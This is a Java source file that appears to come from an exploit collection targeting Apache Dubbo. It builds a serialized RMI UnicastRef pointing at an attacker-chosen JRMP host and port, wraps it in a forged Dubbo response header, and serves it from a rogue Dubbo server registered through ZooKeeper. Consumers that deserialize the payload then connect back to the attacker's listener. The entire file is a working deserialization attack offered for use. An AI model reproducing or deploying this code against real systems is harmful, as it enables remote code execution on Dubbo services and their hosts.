package com.threedr3am.bug.dubbo.rouge.java;

import com.threedr3am.bug.dubbo.rouge.RougeBase;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.rmi.server.ObjID;
import java.util.Random;
import org.apache.dubbo.common.io.Bytes;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

public class JRMPClient extends RougeBase {

    public static void main(String[] args) throws Exception {
        //args[0] = 127.0.0.1:8765
        String host;
        int port;
        int sep = args[0].indexOf(':');
        if ( sep < 0 ) {
            port = new Random().nextInt(65535);
            host = args[0];
        }
        else {
            host = args[0].substring(0, sep);
            port = Integer.valueOf(args[0].substring(sep + 1));
        }
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));

        ByteArrayOutputStream jserial2ByteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(jserial2ByteArrayOutputStream);
        objectOutputStream.writeByte(1);
        objectOutputStream.writeObject(ref);
        objectOutputStream.flush();
        objectOutputStream.close();

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set response event and serialization flag.
        header[2] = (byte) ((byte) 0x20 | 3);
        header[3] = 20;

        // set response id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

        Bytes.int2bytes(jserial2ByteArrayOutputStream.size(), header, 12);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(jserial2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        String zookeeperUri = "127.0.0.1:2181";
        String rougeHost = "127.0.0.1";
        int rougePort = 33336;

        new JRMPClient().startRougeServer(zookeeperUri, rougeHost, rougePort, bytes, true);
    }

    @Override
    public String getType() {
        return "java";
    }

}
